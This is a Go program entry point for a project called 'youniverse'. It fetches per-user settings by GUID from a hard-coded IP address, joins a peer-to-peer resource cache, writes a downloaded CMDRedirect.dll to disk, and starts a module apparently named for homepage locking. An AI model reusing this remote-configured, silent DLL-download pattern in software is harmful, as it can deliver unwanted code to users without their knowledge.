package main

import (
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/ssoor/youniverse/api"
	"github.com/ssoor/youniverse/homelock"
	"github.com/ssoor/youniverse/log"
	"github.com/ssoor/youniverse/youniverse"
)

const (
	YouniverseListenPort uint16 = 13600
)

var (
	ErrorSocketUnavailable error = errors.New("socket port not find")
)

func SocketSelectPort(port_type string, port_base int) (int16, error) {

	for ; port_base < 65536; port_base++ {

		tcpListener, err := net.Listen(port_type, ":"+strconv.Itoa(port_base))

		if err == nil {
			tcpListener.Close()
			return int16(port_base), nil
		}
	}

	return 0, ErrorSocketUnavailable
}

func getStartSettings(guid string) (config Config, err error) {

	url := "http://120.26.80.61/issued/settings/20160404/" + guid + ".settings"

	json_config, err := api.GetURL(url)
	if err != nil {
		return config, errors.New("Query setting interface failed.")
	}

	if err = json.Unmarshal([]byte(json_config), &config); err != nil {
		return config, errors.New("Unmarshal setting interface failed.")
	}

	return config, nil
}
func getInternalIPs() (ips []string, err error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ips, err
	}

	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}

	return ips, nil
}

var (
	ErrorNotValidAddress = errors.New("Not a valid link address")
)

func getConnectIP(connType string, connHost string) (ip string, err error) { //Get ip
	conn, err := net.Dial(connType, connHost)
	if err != nil {
		return ip, err
	}

	defer conn.Close()

	strSplit := strings.Split(conn.LocalAddr().String(), ":")

	if len(strSplit) < 2 {
		return ip, ErrorNotValidAddress
	}

	return strSplit[0], nil
}

func downloadResourceToFile(resourceKey string, fileName string) (int, error) {

	var data []byte

	if err := youniverse.Get(nil, resourceKey, &data); nil != err {
		return 0, errors.New(fmt.Sprintln(resourceKey, "download failed:", err))
	}

	file, err := os.Create(fileName)

	if nil != err {
		return 0, errors.New(fmt.Sprintln(resourceKey, "create failed:", err))
	}

	defer file.Close()

	writeSize, err := file.Write(data)

	if nil != err {
		return 0, errors.New(fmt.Sprintln(resourceKey, "save failed:", err))
	}

	return writeSize, nil
}

func main() {
	var guid string

	flag.StringVar(&guid, "guid", "00000000_00000000", "user unique identifier,used to obtain user configuration")

	flag.Parse()

	port, err := SocketSelectPort("tcp", int(YouniverseListenPort))

	if err != nil {
		log.Error.Printf("Select youniverse listen port failed: %s\n", err)
		return
	}

	config, err := getStartSettings(guid)

	if err != nil {
		log.Error.Printf("Request start settings failed: %s\n", err)
		return
	}

	log.Info.Println("[MAIN] Start youniverse module:")
	connInternalIP, err := getConnectIP("tcp", "www.baidu.com:80")

	if err != nil {
		log.Error.Printf("Query connection ip failed: %s\n", err)
		return
	}

	peerAddr := connInternalIP + ":" + strconv.Itoa(int(port))
	if err := youniverse.StartYouniverse(guid, peerAddr, config.Youniverse); err != nil {
		log.Error.Printf("Youniverse start failed: %s\n", err)
		return
	}

	fileSize, err := downloadResourceToFile("CMDRedirect.dll", "CMDRedirect.dll")

	if nil != err {
		log.Error.Printf("Resource Download failed: %s\n", err)
		return
	} else {
		log.Info.Println("Download CMDRedirect.dll success, resource size is", fileSize)
	}

	log.Info.Println("Youniverse stats info:")
    
	log.Info.Println("\tGET : ", youniverse.Resource.Stats.Gets.String());
	log.Info.Println("\tLOAD : ", youniverse.Resource.Stats.Loads.String(),"\tHIT  : ", youniverse.Resource.Stats.CacheHits.String())
	log.Info.Println("\tPEER : ", youniverse.Resource.Stats.PeerLoads.String(), "\tERROR: ", youniverse.Resource.Stats.PeerErrors.String())
	log.Info.Println("\tLOCAL: ", youniverse.Resource.Stats.LocalLoads.String(), "\tERROR: ",youniverse.Resource.Stats.LocalLoadErrs.String())

	log.Info.Println("[MAIN] Start homelock module:")
	if err := homelock.StartHomelock(guid, config.Homelock); err != nil {
		log.Warning.Printf("\tStart failed: %s\n", err)
	}

	log.Info.Println("[MAIN] Module start end")

	ch := make(chan int, 4)
	<-ch

	log.Info.Println("[MAIN] Process is exit")

	//cache.Get(nil,"test",groupcache.AllocatingByteSliceSink(&data))
}
